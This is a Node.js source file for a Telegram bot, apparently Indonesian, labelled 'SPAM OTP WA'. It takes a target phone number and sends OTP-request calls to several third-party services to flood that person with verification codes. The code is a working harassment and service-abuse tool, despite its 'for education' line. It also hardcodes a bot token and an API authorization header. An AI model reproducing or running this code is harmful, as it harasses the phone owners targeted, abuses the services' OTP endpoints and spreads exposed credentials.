 const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const colors = require('colors');

// Initialize Telegram Bot
const token = '7863322072:AAFLohSBYqeTpx8eLrsZz0YBD_4rEP627-4';
const bot = new TelegramBot(token, { polling: true });

// Color definitions
const hijau = colors.green;
const putih = colors.white;
const kuning = colors.yellow;
const merah = colors.red;
const biru = colors.cyan;

// User sessions
const userSessions = {};

// Main menu keyboard
const mainMenu = {
  reply_markup: {
    keyboard: [
      ['/memulai', '/spam'],
      ['/help', '/about']
    ],
    resize_keyboard: true,
    one_time_keyboard: true
  }
};

// Spam menu keyboard
const spamMenu = {
  reply_markup: {
    keyboard: [
      ['🚀 Mulai Spam', '⏸️ Jeda Spam'],
      ['🔢 Ganti Nomor', '🔙 Kembali']
    ],
    resize_keyboard: true
  }
};

// Start command
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, `Selamat datang di ${merah("MySpamBot")}\n\nGunakan menu di bawah untuk memulai:`, mainMenu);
});

// Help command
bot.onText(/\/help/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, `${kuning("Perintah yang tersedia:")}
  WELCOME TO SPAM OTP WA 
        LORDHOZOO
/memulai - Mulai sesi spam baru
/spam - Menu pengaturan spam
/help - Menampilkan bantuan
/about - Tentang bot ini

${hijau("Gunakan tombol menu untuk navigasi yang lebih mudah!")}`);
});

// About command
bot.onText(/\/about/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, `${merah("BOT SPAM WA")} ${putih("v1.0")}

${kuning("Author:")} ${hijau("LORDHOZOO")}
${kuning("YT:")} ${biru("LORDHOZOO")}
${kuning("TIKTOK:")} ${biru("LORDHOZOO")}

Bot ini dibuat untuk tujuan edukasi.`);
});

// Memulai command
bot.onText(/\/memulai/, (msg) => {
  const chatId = msg.chat.id;
  userSessions[chatId] = { status: 'awaiting_number' };
  bot.sendMessage(chatId, `${hijau("Masukkan nomor target yang akan di-spam:")}\n\nContoh: 089508226367`);
});

// Spam command
bot.onText(/\/spam/, (msg) => {
  const chatId = msg.chat.id;
  if (userSessions[chatId] && userSessions[chatId].targetNumber) {
    bot.sendMessage(chatId, `${merah("Menu Spam")}\n\nNomor target saat ini: ${userSessions[chatId].targetNumber}`, spamMenu);
  } else {
    bot.sendMessage(chatId, `${merah("Anda belum mengatur nomor target. Gunakan")} /memulai ${merah("terlebih dahulu.")}`);
  }
});

// Handle text messages
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  
  if (!userSessions[chatId]) {
    userSessions[chatId] = {};
  }

  // Handle number input
  if (userSessions[chatId].status === 'awaiting_number') {
    if (/^[0-9]{10,14}$/.test(text)) {
      userSessions[chatId].targetNumber = text;
      userSessions[chatId].status = 'ready';
      bot.sendMessage(chatId, `${hijau("Nomor target disimpan:")} ${text}\n\nGunakan ${merah("/spam")} untuk memulai.`, mainMenu);
    } else {
      bot.sendMessage(chatId, `${merah("Format nomor tidak valid!")}\n\nMasukkan nomor yang valid (10-14 digit angka)\nContoh: 089508226367`);
    }
    return;
  }

  // Handle spam menu buttons
  if (text === '🚀 Mulai Spam') {
    if (userSessions[chatId].targetNumber) {
      bot.sendMessage(chatId, `${hijau("Memulai spam ke nomor:")} ${userSessions[chatId].targetNumber}`, spamMenu);
      await startSpam(chatId, userSessions[chatId].targetNumber);
    } else {
      bot.sendMessage(chatId, `${merah("Nomor target belum diatur. Gunakan")} /memulai ${merah("terlebih dahulu.")}`);
    }
  } else if (text === '⏸️ Jeda Spam') {
    // Implement pause logic here
    bot.sendMessage(chatId, `${kuning("Fitur jeda belum diimplementasikan.")}`, spamMenu);
  } else if (text === '🔢 Ganti Nomor') {
    userSessions[chatId].status = 'awaiting_number';
    bot.sendMessage(chatId, `${hijau("Masukkan nomor target baru:")}\n\nContoh: 089508226367`);
  } else if (text === '🔙 Kembali') {
    bot.sendMessage(chatId, `${hijau("Kembali ke menu utama")}`, mainMenu);
  }
});

// Spam function
async function startSpam(chatId, nomor) {
  const b = nomor.substring(1);
  const c = `62${b}`;
  
  try {
    bot.sendMessage(chatId, `${hijau("Memulai spam ke:")} ${nomor}...`);
    
    // Make requests to different services
    const requests = [
      axios.get(`https://core.ktbs.io/v2/user/registration/otp/${nomor}`),
      axios.post("https://api.klikwa.net/v1/number/sendotp", 
        { number: `+62${b}` },
        { headers: { 'Authorization': 'Basic QjMzOkZSMzM=' } }
      ),
      axios.post("https://api.payfazz.com/v2/phoneVerifications", 
        { phone: `0${nomor}` },
        { headers: { 'Host': 'api.payfazz.com' } }
      )
    ];

    await Promise.all(requests);
    
    bot.sendMessage(chatId, `${hijau("Spam berhasil dikirim ke:")} ${nomor}`);
    
  } catch (error) {
    bot.sendMessage(chatId, `${merah("Error saat mengirim spam:")}\n${error.message}`);
  }
}

console.log(`${hijau("Bot sedang berjalan...")}`);
